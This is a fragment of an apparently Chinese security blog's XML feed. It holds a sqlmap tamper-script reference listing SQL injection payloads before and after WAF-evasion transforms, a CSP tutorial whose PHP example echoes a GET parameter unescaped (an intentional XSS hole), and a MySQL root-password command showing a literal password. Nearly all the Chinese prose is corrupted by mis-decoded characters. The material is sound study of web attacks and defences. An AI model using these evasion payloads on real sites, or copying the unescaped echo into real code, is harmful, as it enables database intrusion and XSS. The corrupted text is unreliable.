1000001001000111101011111001011111110100100010101000001100‰∏ÄÂÖ±ÂÖ´ÁôæÂõõÂçÅ‰∏Ä‰∏™Â≠óÁ¨¶Ôºå29*29ÁöÑÊñπÈòµ„ÄÇÂú®word‰∏≠Â≠óÁ¨¶ÊõøÊç¢Áõ¥Êé•Êâ´Á†Å 0ÊõøÊç¢‚ñ°Ôºå1ÊõøÊç¢‚ñ† Âç≥ÂèØ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmapÂèätamperÁî®Ê≥ï]]></title>
    <url>%2F2019%2F09%2F19%2Fsqlmap%E5%8F%8Atamper%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Ëá™Â∏¶tamperÂèäÁî®Ê≥ïapostrophemask.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂ∞ÜÂºïÂè∑ÊõøÊç¢‰∏∫utf-8ÔºåÁî®‰∫éËøáÊª§ÂçïÂºïÂè∑‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÊõøÊç¢‰∏∫base64ÁºñÁ†Å‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&quot;1&#39; AND SLEEP(5)#&quot;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöMScgQU5EIFNMRUVQKDUpIw== multiplespaces.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂõ¥ÁªïsqlÂÖ≥ÈîÆÂ≠óÊ∑ªÂä†Â§ö‰∏™Á©∫Ê†º‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 UNION SELECT foobar&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 UNION SELECT foobar space2plus.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÁî®Âä†Âè∑ÊõøÊç¢Á©∫Ê†º‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT+id+FROM+users nonrecursivereplacement.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®Ôºö‰Ωú‰∏∫ÂèåÈáçÊü•ËØ¢ËØ≠Âè•ÔºåÁî®ÂèåÈáçËØ≠Âè•Êõø‰ª£È¢ÑÂÆö‰πâÁöÑsqlÂÖ≥ÈîÆÂ≠óÔºàÈÄÇÁî®‰∫éÈùûÂ∏∏Âº±ÁöÑËá™ÂÆö‰πâËøáÊª§Âô®Ôºå‰æãÂ¶ÇÂ∞ÜselectÊõøÊç¢‰∏∫Á©∫Ôºâ‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 UNION SELECT 2--&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 UNIOUNIONN SELESELECTCT 2-- space2randomblank.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫ÂÖ∂‰ªñÊúâÊïàÂ≠óÁ¨¶‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT%0Did%0DFROM%0Ausers unionalltounion.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂ∞Üunion allselect ÊõøÊç¢‰∏∫unionselect‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;-1 UNION ALL SELECT&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö-1 UNION SELECT securesphere.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöËøΩÂä†ÁâπÂÆöÁöÑÂ≠óÁ¨¶‰∏≤‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 1=1&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39; space2dash.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫--ÔºåÂπ∂Ê∑ªÂä†‰∏Ä‰∏™ÈöèÊú∫Â≠óÁ¨¶‰∏≤ÂíåÊç¢Ë°åÁ¨¶‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 9227=9227&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227 space2mssqlblank.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMicrosoft SQL ServerÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2000„ÄÅMicrosoft SQL Server 2005‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÈöèÊú∫ÊõøÊç¢‰∏∫ÂÖ∂‰ªñÁ©∫Ê†ºÁ¨¶Âè∑(&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;, &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;, &#39;%0A&#39;)‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT%0Eid%0DFROM%07users between.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2005„ÄÅMySQL 4, 5.0 and 5.5„ÄÅOracle 10g„ÄÅPostgreSQL 8.3, 8.4, 9.0‰ΩúÁî®ÔºöÁî®NOT BETWEEN 0 AND #ÊõøÊç¢&gt;‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND A &gt; B--&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND A NOT BETWEEN 0 AND B-- percentage.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöASPÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2000, 2005„ÄÅMySQL 5.1.56, 5.5.11„ÄÅPostgreSQL 9.0‰ΩúÁî®ÔºöÂú®ÊØè‰∏™Â≠óÁ¨¶ÂâçÊ∑ªÂä†‰∏Ä‰∏™%‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT FIELD FROM TABLE&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E sp_password.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMSSQL‰ΩúÁî®Ôºö‰ªéT-SQLÊó•ÂøóÁöÑËá™Âä®Ëø∑Á≥äÂ§ÑÁêÜÁöÑÊúâÊïàËΩΩËç∑‰∏≠ËøΩÂä†sp_password‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 9227=9227-- &#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND 9227=9227-- sp_password charencode.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2005„ÄÅMySQL 4, 5.0 and 5.5„ÄÅOracle 10g„ÄÅPostgreSQL 8.3, 8.4, 9.0‰ΩúÁî®ÔºöÂØπÁªôÂÆöÁöÑpayloadÂÖ®ÈÉ®Â≠óÁ¨¶‰ΩøÁî®urlÁºñÁ†ÅÔºà‰∏çÂ§ÑÁêÜÂ∑≤ÁªèÁºñÁ†ÅÁöÑÂ≠óÁ¨¶Ôºâ‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT FIELD FROM%20TABLE&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 randomcase.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2005„ÄÅMySQL 4, 5.0 and 5.5„ÄÅOracle 10g„ÄÅPostgreSQL 8.3, 8.4, 9.0‰ΩúÁî®ÔºöÈöèÊú∫Â§ßÂ∞èÂÜô‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;INSERT&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöINseRt charunicodeencode.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöASP„ÄÅASP.NETÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2000/2005„ÄÅMySQL 5.1.56„ÄÅPostgreSQL 9.0.3‰ΩúÁî®ÔºöÈÄÇÁî®Â≠óÁ¨¶‰∏≤ÁöÑunicodeÁºñÁ†Å‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT FIELD%20FROM TABLE&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 space2comment.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2005„ÄÅMySQL 4, 5.0 and 5.5„ÄÅOracle 10g„ÄÅPostgreSQL 8.3, 8.4, 9.0‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫/**/‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT/**/id/**/FROM/**/users equaltolike.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMicrosoft SQL Server 2005„ÄÅMySQL 4, 5.0 and 5.5‰ΩúÁî®ÔºöÂ∞Ü=ÊõøÊç¢‰∏∫LIKE‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT * FROM users WHERE id=1&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT * FROM users WHERE id LIKE 1 equaltolike.pyÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 4, 5.0 and 5.5„ÄÅOracle 10g„ÄÅPostgreSQL 8.3, 8.4, 9.0‰ΩúÁî®ÔºöÂ∞Ü&gt;ÊõøÊç¢‰∏∫GREATESTÔºåÁªïËøáÂØπ&gt;ÁöÑËøáÊª§‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND A &gt; B&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND GREATEST(A,B+1)=A ifnull2ifisnull.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQL„ÄÅSQLite (possibly)„ÄÅSAP MaxDB (possibly)ÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.0 and 5.5‰ΩúÁî®ÔºöÂ∞ÜÁ±ª‰ºº‰∫éIFNULL(A, B)ÊõøÊç¢‰∏∫IF(ISNULL(A), B, A)ÔºåÁªïËøáÂØπIFNULLÁöÑËøáÊª§‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;IFNULL(1, 2)&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöIF(ISNULL(1),2,1) modsecurityversioned.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQLÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.0‰ΩúÁî®ÔºöËøáÊª§Á©∫Ê†ºÔºå‰ΩøÁî®mysqlÂÜÖËÅîÊ≥®ÈáäÁöÑÊñπÂºèËøõË°åÊ≥®ÂÖ•‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 2&gt;1--&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 /*!30874AND 2&gt;1*/-- space2mysqlblank.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQLÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.1‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫ÂÖ∂‰ªñÁ©∫Ê†ºÁ¨¶Âè∑(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0B&#39;)‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT%0Bid%0DFROM%0Cusers modsecurityzeroversioned.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQLÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.0‰ΩúÁî®Ôºö‰ΩøÁî®ÂÜÖËÅîÊ≥®ÈáäÊñπÂºèÔºà/*!00000*/ÔºâËøõË°åÊ≥®ÂÖ•‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 2&gt;1--&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 /*!00000AND 2&gt;1*/-- space2mysqldash.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQL„ÄÅMSSQL‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫ -- ÔºåÂπ∂ËøΩÈöè‰∏Ä‰∏™Êç¢Ë°åÁ¨¶‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 9227=9227&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1--%0AAND--%0A9227=9227 bluecoat.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöBlue Coat SGOSÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.1,„ÄÅSGOS‰ΩúÁî®ÔºöÂú®sqlËØ≠Âè•‰πãÂêéÁî®ÊúâÊïàÁöÑÈöèÊú∫Á©∫ÁôΩÂ≠óÁ¨¶ÊõøÊç¢Á©∫Ê†ºÁ¨¶ÔºåÈöèÂêéÁî®LIKEÊõøÊç¢=‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT id FROM users where id = 1&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöSELECT%09id FROM users where id LIKE 1 versionedkeywords.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQLÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 4.0.18, 5.1.56, 5.5.11‰ΩúÁî®ÔºöÊ≥®ÈáäÁªïËøá‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))# halfversionedmorekeywords.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQL &lt; 5.1ÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 4.0.18/5.0.22‰ΩúÁî®ÔºöÂú®ÊØè‰∏™ÂÖ≥ÈîÆÂ≠óÂâçÊ∑ªÂä†mysqlÁâàÊú¨Ê≥®Èáä‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºövalue&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa space2morehash.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöMySQL &gt;= 5.1.13ÊµãËØïÈÄöËøáÊï∞ÊçÆÂ∫ìÔºöMySQL 5.1.41‰ΩúÁî®ÔºöÂ∞ÜÁ©∫Ê†ºÊõøÊç¢‰∏∫#ÔºåÂπ∂Ê∑ªÂä†‰∏Ä‰∏™ÈöèÊú∫Â≠óÁ¨¶‰∏≤ÂíåÊç¢Ë°åÁ¨¶‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 9227=9227&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 apostrophenullencode.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÁî®ÈùûÊ≥ïÂèåÂ≠óËäÇUnicodeÂ≠óÁ¨¶ÊõøÊç¢ÂçïÂºïÂè∑‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND %00%271%00%27=%00%271 appendnullbyte.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂú®ÊúâÊïàËΩΩËç∑ÁöÑÁªìÊùü‰ΩçÁΩÆÂä†ËΩΩnullÂ≠óËäÇÂ≠óÁ¨¶ÁºñÁ†Å‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;1 AND 1=1&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1 AND 1=1%00 chardoubleencode.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÂØπÁªôÂÆöÁöÑpayloadÂÖ®ÈÉ®Â≠óÁ¨¶‰ΩøÁî®ÂèåÈáçurlÁºñÁ†ÅÔºà‰∏çÂ§ÑÁêÜÂ∑≤ÁªèÁºñÁ†ÅÁöÑÂ≠óÁ¨¶Ôºâ‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;SELECT FIELD FROM%20TABLE&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545 unmagicquotes.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÁî®‰∏Ä‰∏™Â§öÂ≠óËäÇÁªÑÂêà%bf%27ÂíåÊú´Â∞æÈÄöÁî®Ê≥®Èáä‰∏ÄËµ∑ÊõøÊç¢Á©∫Ê†º‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&quot;1&#39; AND 1=1&quot;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºö1%bf%27 AND 1=1-- randomcomments.pyÈÄÇÁî®Êï∞ÊçÆÂ∫ìÔºöALL‰ΩúÁî®ÔºöÁî®Ê≥®ÈáäÁ¨¶ÂàÜÂâ≤sqlÂÖ≥ÈîÆÂ≠ó‰ΩøÁî®ËÑöÊú¨ÂâçÔºötamper(&#39;INSERT&#39;)‰ΩøÁî®ËÑöÊú¨ÂêéÔºöI/**/N/**/SERT ÁºñÂÜôtamperÈ¢ùÂ§ñËÆ∞ÂΩïmysql8.0.11‰øÆÊîπrootÂØÜÁ†Å 1`ALTER` `user` `&apos;root&apos;``@``&apos;localhost&apos;` `IDENTIFIED ``BY` `&apos;Cliu123#&apos;` Ê≠§Â§ÑÊúâ‰∏§ÁÇπÈúÄË¶ÅÊ≥®ÊÑèÔºö 1„ÄÅ‰∏çÈúÄË¶Åflush privilegesÊù•Âà∑Êñ∞ÊùÉÈôê„ÄÇ 2„ÄÅÂØÜÁ†ÅË¶ÅÂåÖÂê´Â§ßÂÜôÂ≠óÊØçÔºåÂ∞èÂÜôÂ≠óÊØçÔºåÊï∞Â≠óÔºåÁâπÊÆäÁ¨¶Âè∑„ÄÇ]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cspÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•]]></title>
    <url>%2F2019%2F06%2F25%2Fcsp%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[ÁÆÄ‰ªãÂú®webÁöÑÂÆâÂÖ®Ê®°Âºè‰∏≠ÔºåÊúâ‰∏Ä‰∏™ËëóÂêçÁöÑÁ≠ñÁï•‚ÄîÂêåÊ∫êÁ≠ñÁï•ÔºåWebÊòØÊûÑÂª∫Âú®ÂêåÊ∫êÁ≠ñÁï•Âü∫Á°Ä‰πã‰∏äÁöÑÔºåÂêåÊ∫êÁ≠ñÁï•ÊòØÊµèËßàÂô®ÁöÑË°å‰∏∫ÔºåÊòØ‰∏∫‰∫Ü‰øùÊä§Êú¨Âú∞Êï∞ÊçÆ‰∏çË¢´JavaScript‰ª£Á†ÅËé∑ÂèñÂõûÊù•ÁöÑÊï∞ÊçÆÊ±°ÊüìÔºåÂõ†Ê≠§Êã¶Êà™ÁöÑÊòØÂÆ¢Êà∑Á´ØÂèëÂá∫ÁöÑËØ∑Ê±ÇÂõûÊù•ÁöÑÊï∞ÊçÆÊé•Êî∂ÔºåÂç≥ËØ∑Ê±ÇÂèëÈÄÅ‰∫ÜÔºåÊúçÂä°Âô®ÂìçÂ∫î‰∫ÜÔºå‰ΩÜÊòØÊó†Ê≥ïË¢´ÊµèËßàÂô®Êé•Êî∂„ÄÇ ËÄåXSSË∑®Á´ôËÑöÊú¨ÊîªÂáªÂàôÂèØ‰ª•ÁªïËøáÂêåÊ∫êÁ≠ñÁï•Êù•ËøõË°åÊÅ∂ÊÑèÊîªÂáªÔºåÊ≠§Êó∂Â∞±Êúâ‰∏Ä‰∏™Êñ∞ÁöÑÈò≤Âæ°‚ÄîÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•ÔºàcspÔºâ„ÄÇ cspÊòØÈááÁî®ÁôΩÂêçÂçïÂà∂Â∫¶ÔºåÊòéÁ°ÆËßÑÂÆöÂì™‰∫õÂüüËµÑÊ∫êÂèØ‰ª•Âä†ËΩΩÊàñËÄÖÊâßË°åÔºåÂç≥‰ΩøÂ≠òÂú®XSSÊºèÊ¥ûÔºå‰πüÊó†Ê≥ïÊâßË°åÔºåÂ∞±ËøûÊúÄÂü∫Á°ÄÁöÑÂºπÁ™ó‰πüÊó†Ê≥ïÂÆûÁé∞ÔºåÈô§ÈùûÊéßÂà∂‰∫ÜÁôΩÂêçÂçïÁöÑÂüü‰∏ªÊú∫„ÄÇ ‰ª£Á†ÅÊµãËØï‰∏Ä‰∏™‰æãÂ≠êÂ∞±ÂæàÂ•ΩÁêÜËß£„ÄÇ Êó†Èò≤Êä§&lt;html&gt; &lt;!-- &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; &apos;nonce-123456&apos;;&quot;&gt; &lt;body&gt; --&gt; &lt;?php echo $_GET[&apos;xss&apos;]; ?&gt; &lt;/body&gt; &lt;/html&gt;‰ªªÊÑèXSS‰º†ÈÄíÁöÑÂèÇÊï∞ÈÉΩ‰ºöËæìÂá∫Âá∫Êù•ÔºåÊ≠§Êó∂Ê≥®Èáä‰∫ÜcspËÆæÁΩÆÔºåÊâÄ‰ª•ÊòØÂ≠òÂú®XSSÊºèÊ¥ûÁöÑ„ÄÇ CSPÈò≤Êä§ÁÑ∂ÂêéÂ¢ûÂä†cspÂ§¥ËÆæÁΩÆ„ÄÇ &lt;html&gt; &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; &apos;nonce-123456&apos;;&quot;&gt; &lt;body&gt; &lt;?php echo $_GET[&apos;xss&apos;]; ?&gt; &lt;/body&gt; &lt;/html&gt; ‰∏ç‰ºö‰∫ßÁîüÂºπÁ™óÔºåcspÂè™‰ºöÂä†ËΩΩselfËµÑÊ∫êÔºå‰ª•Âèänonce-123456Ê†áÁ≠æ‰∏ãÁöÑÂÜÖÂÆπ„ÄÇ Âä†ËΩΩ‰ø°‰ªªÁöÑÊ†áÁ≠æ„ÄÇ ÈôêÂà∂ÂüüËµÑÊ∫êÂä†ËΩΩ&lt;html&gt; &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src http://47.106.185.69; child-src &apos;none&apos;;&quot;&gt; &lt;body&gt; &lt;?php echo $_GET[&apos;xss&apos;]; ?&gt; &lt;/body&gt; &lt;/html&gt;ËøôÈáåÈôêÂà∂ÁöÑimg-srcÂè™ËÉΩÊé•Êî∂47.106.185.69ÂüüÁöÑÂõæÁâá„ÄÇÂ¶ÇÊûúÂä†ËΩΩÂÖ∂‰ªñÂüüÁöÑÂõæÁâáÂàô‰ºöË¢´cspÊã¶Êà™„ÄÇ ËÄåÂä†ËΩΩÁôΩÂêçÂçïÁªôÂá∫ÁöÑÂüü‰∏ç‰ºöÂèóÊã¶Êà™ Â∏∏Áî®Á≠ñÁï•Êåá‰ª§default-src Êåá‰ª§ÂÆö‰πâ‰∫ÜÈÇ£‰∫õÊ≤°ÊúâË¢´Êõ¥Á≤æÁ°ÆÊåá‰ª§ÊåáÂÆöÁöÑÂÆâÂÖ®Á≠ñÁï•„ÄÇËøô‰∫õÊåá‰ª§ÂåÖÊã¨Ôºö child-src connect-src font-src img-src media-src object-src script-src style-srcscript-src script-srcÂÆö‰πâ‰∫ÜÈ°µÈù¢‰∏≠JavascriptÁöÑÊúâÊïàÊù•Ê∫êstyle-src style-srcÂÆö‰πâ‰∫ÜÈ°µÈù¢‰∏≠CSSÊ†∑ÂºèÁöÑÊúâÊïàÊù•Ê∫êimg-src img-srcÂÆö‰πâ‰∫ÜÈ°µÈù¢‰∏≠ÂõæÁâáÂíåÂõæÊ†áÁöÑÊúâÊïàÊù•Ê∫êfont-src font-srcÂÆö‰πâ‰∫ÜÂ≠ó‰ΩìÂä†ËΩΩÁöÑÊúâÊïàÊù•Ê∫êconnect-src connect-srcÂÆö‰πâ‰∫ÜËØ∑Ê±Ç„ÄÅXMLHttpRequest„ÄÅWebSocket Âíå EventSource ÁöÑËøûÊé•Êù•Ê∫ê„ÄÇchild-src child-src ÊåáÂÆöÂÆö‰πâ‰∫Ü web workers ‰ª•ÂèäÂµåÂ•óÁöÑÊµèËßà‰∏ä‰∏ãÊñáÔºàÂ¶Ç&lt;frame&gt;Âíå&lt;iframe&gt;ÔºâÁöÑÊ∫ê„ÄÇÂèñÊ∂àdefault-srcÁöÑËÆæÁΩÆ &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src * &apos;unsafe-inline&apos;; img-src http://47.106.185.69; child-src &apos;none&apos;;&quot;&gt;Âè™ÈúÄË¶ÅÂ§öËÆæÁΩÆ‰∏Ä‰∏™‚Äôunsafe-inline‚ÄôÔºåÂç≥ÂèØÂä†ËΩΩ‰ªªÊÑèjs‰ª£Á†Å„ÄÇ ÂêØÁî®Ëøù‰æãÊä•ÂëäËäÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËøùËßÑÊä•ÂëäÂπ∂‰∏ç‰ºöÂèëÈÄÅ„ÄÇ‰∏∫ÂêØÁî®ÂèëÈÄÅËøùËßÑÊä•ÂëäÔºå‰Ω†ÈúÄË¶ÅÊåáÂÆö report-uri Á≠ñÁï•Êåá‰ª§ÔºåÂπ∂Êèê‰æõËá≥Â∞ë‰∏Ä‰∏™URIÂú∞ÂùÄÂéªÈÄí‰∫§Êä•ÂëäÔºö Content-Security-Policy: default-src &apos;self&apos;; report-uri http://reportcollector.example.com/collector.cgiÁÑ∂Âêé‰Ω†ÈúÄË¶ÅËÆæÁΩÆ‰Ω†ÁöÑÊúçÂä°Âô®ËÉΩÂ§üÊé•Êî∂Êä•ÂëäÔºå‰ΩøÂÖ∂ËÉΩÂ§ü‰ª•‰Ω†ËÆ§‰∏∫ÊÅ∞ÂΩìÁöÑÊñπÂºèÂ≠òÂÇ®Âπ∂Â§ÑÁêÜËøô‰∫õÊä•Âëä„ÄÇ ÂèÇËÄÉÔºöhttps://www.jianshu.com/p/f1de775bc43eÂèÇËÄÉÔºöhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphpÊ°ÜÊû∂Â≠¶‰π†]]></title>
    <url>%2F2019%2F05%2F25%2Fthinkphp3.2.3%2F</url>
